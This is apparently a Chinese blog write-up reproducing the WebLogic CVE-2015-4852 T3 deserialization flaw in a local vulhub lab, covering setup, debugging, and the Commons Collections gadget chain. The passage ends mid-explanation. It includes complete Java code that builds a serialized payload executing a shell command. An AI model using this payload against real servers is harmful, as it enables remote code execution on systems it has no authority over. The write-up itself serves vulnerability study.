## 1\. weblogic是什么?
> 摘自wikipedia
WebLogic是美商Oracle的主要产品之一，系购并得来。是商业市场上主要的Java应用服务器软件之一，是世界上第一个成功商业化的J2EE应用服务器
## 2\. 历史漏洞
  * CVE-2015-4852
  * CVE-2016-0638
  * CVE-2016-3510
  * CVE-2017-3248
  * CVE-2017-3506
  * CVE-2017-10271
  * CVE-2018-2628
  * CVE-2018-2893
  * CVE-2018-3191
  * CVE-2018-3197
  * CVE-2018-3201
  * CVE-2018-3245
  * CVE-2019-2890
但是据参考文章所言，主要其实可以分为两大块:
1、利用xml decoded反序列化进行远程代码执行的漏洞，例如：
CVE-2017-10271，CVE-2017-3506。
2、利用t3协议+java反序列化进行远程代码执行的漏洞，例如：
CVE-2015-4852、CVE-2016-0638、CVE-2016-3510、CVE-2017-3248、CVE-2018-2628、CVE-2018-2894
> 这篇文章主要是我复现CVE-2015-4852的过程记录，这个漏洞利用的是后者，也就是t3协议+java反序列化
## 3\. 前置知识
> 因为本文的主要内容是对漏洞的复现和原理分析，所以这部分并没有详细展开
### 3.1 RMI、JRMP、JNDI协议
RMI是Rmote Method Invocation的简称，RMI目前使用JRMP进行通信。  
JRMP指的是java remote method protocol（Java远程消息交换协议），也就是说JRMP是专门为RMI实现的协议。
### 3.2 T3协议
上面提到的JRMP协议是rmi默认使用的协议，但是Weblogic
Server中的RMI通信使用T3协议和其他java程序间传输数据（序列化的类），t3协议是高度优化的rmi，更详细的内容可以参考下面的T3协议部分
### 3.3 java序列化与反序列化
  * Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，`ObjectOutputStream`类的`writeObject()`方法可以实现序列化。
  * Java 反序列化是指把字节序列恢复为 Java 对象的过程，`ObjectInputStream`类的`readObject()`方法用于反序列化。
  * 在反序列化时，如果我们输入的序列化内容可以控制`readObject`里面的一些内容来触发`Runtime.getRuntime.exec`，就可以实现命令执行。  
### 3.4 反射机制
JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。以下面代码为例简单说明。
    package com.b1ClassLoader;
    import java.lang.reflect.Method;
    public class Test {
        public static void main (String[] args) throws Exception{
            // 实例化一个TestUser类
            TestUser user=new TestUser();
            // Class类可以通过 对象的getCLass方法获取
            Class cls = user.getClass();
            // 也可以通过 类名.class获取
            Class cls2 = TestUser.class;
            // 还可以通过Class.forName
            Class cls3 = Class.forName("com.b1ClassLoader.TestUser");
            // 通过实例的Class类对象来调用这个对象里面的method，如果Method有参数，在getMethod后面的参数上赋值相应的参数类型，譬如这里setUsername的一个参数是String类型
            Method method = cls.getMethod("hello");
            Method method2 = cls2.getMethod("setUsername", String.class);
            //最后通过 Method.invoke调用方法，同样的，如果有参数，往后面放
            method.invoke(user);
            method2.invoke(user,"testname");
            System.out.println(user.getUsername());
        }
    }
    class TestUser{
        private String username;
        public String getUsername() {
            return username;
        }
        public void setUsername(String username) {
            this.username = username;
        }
        public void hello(){
            System.out.println("hello");
        }
    }
## 4\. 漏洞复现
环境: 在 ubuntu 16.04 上跑的vulhub的weblogic docker镜像,具体版本是:
  * jdk1.6.0_45
  * weblogic 10.3.6
  * 在mac上装了jdk1.6.0_65用来编译exp
### 4.1 配置weblogic环境
这里使用的vulhub的docker，为了自己能自己从脚本启动，微微改了一下文件:
  * docker-compose.yml
        version: '2'
    services:
    weblogic:
     build: .
     ports:
      - "7001:7001"
      - "8453:8453"
  * Dockerfile
    from vulhub/weblogic:10.3.6.0-2017
    ENV debugFlag true 
    EXPOSE 7001 
    EXPOSE 8453
    CMD ["/bin/sh","-c","while true;do echo 1;sleep 10;done"]
使用`docker-compose up
-d`启动后进入docker，修改`~/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh`，在开头加上
    debugFlag="true" 
    export debugFlag
然后执行`sudo docker restart [容器id]`，然后把docker容器root目录下的内容复制出来。
    docker cp [容器id]:/root .
### 4.2 配置idea远程调试
> idea远程调试原理就是本地有跟服务器上一样的lib文件，然后在本地的lib代码里下断点，通过debug就可以在远程服务器时在本地断点停住
用idea打开拷贝出来的目录`/root/Oracle/Middleware/wlserver_10.3`。通过上面的原理就知道，实际上要调试那个类文件就把那个class文件所在的jar加入到libraries中，这里要添加server目录下的`modules`文件夹和。在idea左上角File->Project
Structure里找到Libraries，添加上即可。  
在idea中File->Project Structure里找到Project，这里选择从docker里拷出来的jdk，也就是jdk1.6.0_45  
最后，在右上角`Add Configuration`，添加remote服务器，填写ip和端口  
然后点击debug开始监听。
>
> 根据参考链接3的文章，这里在`/wlserver_10.3/server/lib/weblogic.jar!/weblogic/wsee/jaxws/WLSServletAdapter.class`的129行下断点，然后访问/wls-> wsat/，但是我怎么弄也无法在这里断点停住。。
于是换了思路，找了网上有关这个CVE的可用的EXP打一下，看EXP里调用了`ChainedTransformer`里的`transform`方法，  
对于本文路径是`/modules/com.bea.core.apache.commons.collections_3.2.0.jar!/org/apache/commons/collections/functors/ChainedTransformer.class`,我直接在这个`transfrom`方法这里下断点，然后用exp打，终于停住
这样可以看到整个exp在代码中执行的过程了，但是还是需要分析原理才能理解整个过程。
### 4.3 新的问题
此时开始探究exp的原理，也就是commonscollections的调用链，代码在下面会贴出来。但问题就在于，本地无法编译执行，因为mac上装了高版本jdk后装不了jdk1.6了。中间也考虑用docker起个jdk1.6.45来编译，但是编译之后各种报错，没太搞懂就放弃了，最后还是找到[这篇文章](https://blog.csdn.net/Kaitiren/article/details/105007951)，成功在mac装上了jdk1.6。
### 4.4 apache.commons.collections利用链
接下来应该分析一下构造的反序列化利用链，主要是用到了apache
commonscollections，这里以ysoserial的CommonCollections1为例进行分析，调用栈如下：
    Gadget chain:
        ObjectInputStream.readObject()
            AnnotationInvocationHandler.readObject()
                Map(Proxy).entrySet()
                    AnnotationInvocationHandler.invoke()
                        LazyMap.get()
                            ChainedTransformer.transform()
                                ConstantTransformer.transform()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
本地生成一个java序列化文件`poc.ser`的完整的调用代码是:
> 因为漏洞没回显，我这里用的方式是本地nc监听1234端口，然后curl这个端口的方式看是否成功执行了
    package src.main.java;
    import org.apache.commons.collections.*;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.*;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollectionsExp {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers_exec = new Transformer[]{
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"curl 127.0.0.1:1234"})
            };
            Transformer chain = new ChainedTransformer(transformers_exec);
            HashMap innerMap = new HashMap();
            innerMap.put("value", "asdf");
            Map outerMap = TransformedMap.decorate(innerMap, null, chain);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);
            cons.setAccessible(true);
            Object ins = cons.newInstance(java.lang.annotation.Retention.class, outerMap);
            FileOutputStream fos = new FileOutputStream("./poc.ser");
            ObjectOutputStream os = new ObjectOutputStream(fos);
            os.writeObject(ins);
        }
    }
这里首先要说明一下apache.commons.collections里的一些方法.
#### 4.4.1 Transformer
    package org.apache.commons.collections;
    ​
    public interface Transformer {
      Object transform(Object var1);
    }
Transformer只是一个接口，在利用时，我们一般调用实现该接口的类，例如在攻击代码中用到的`InvokerTransformer`
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            this.iMethodName = methodName;
            this.iParamTypes = paramTypes;
            this.iArgs = args;